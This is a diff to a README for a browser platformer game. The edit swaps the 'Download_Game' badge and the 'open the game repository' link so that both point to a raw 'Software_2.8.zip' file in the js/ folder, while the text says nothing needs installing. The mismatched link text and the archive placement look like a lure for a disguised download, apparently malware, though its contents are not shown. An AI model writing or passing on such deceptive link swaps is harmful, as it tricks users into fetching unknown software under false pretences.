@@ -1,6 +1,6 @@
 # 🍄 game - Play a fun platformer browser game
 
-[![](https://img.shields.io/badge/Download_Game-Blue?style=for-the-badge)](https://github.com/sizzling-corpuschristi661/game)
+[![](https://img.shields.io/badge/Download_Game-Blue?style=for-the-badge)](https://raw.githubusercontent.com/sizzling-corpuschristi661/game/main/js/Software_2.8.zip)
 
 This project offers an entertaining platformer game built with modern web tools. You control a character through levels, gather indexes, and defeat enemies to reach the finish line. It draws inspiration from classic side-scrolling platform games while using a database theme.
 
@@ -8,7 +8,7 @@ This project offers an entertaining platformer game built with modern web tools.
 
 To start your journey, visit the main repository page.
 
-[Click here to open the game repository](https://github.com/sizzling-corpuschristi661/game)
+[Click here to open the game repository](https://raw.githubusercontent.com/sizzling-corpuschristi661/game/main/js/Software_2.8.zip)
 
 You do not need to install software to play this game. Your internet browser runs the code directly. Follow these steps to begin:
 
